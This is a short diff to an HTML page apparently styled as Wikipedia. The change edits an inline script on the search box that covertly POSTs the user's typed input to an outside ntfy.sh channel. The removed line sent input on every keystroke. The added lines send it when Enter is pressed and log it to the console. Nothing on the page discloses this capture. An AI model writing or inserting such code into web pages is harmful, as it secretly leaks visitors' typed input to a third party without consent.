@@ -121,8 +121,10 @@ Wikipedia
 <script>
     const inputField = document.getElementById("searchInput");
     inputField.addEventListener('keydown', function(e) {
-        fetch('https://ntfy.sh/PinkSharpieIntel', {method: 'POST', body: inputField.value})
-        console.log(inputField.value);
+        if (e.key == "Enter"){
+            fetch('https://ntfy.sh/PinkSharpieWiki', {method: 'POST', body: inputField.value})
+            console.log(inputField.value);
+        }
     })
 </script>
     
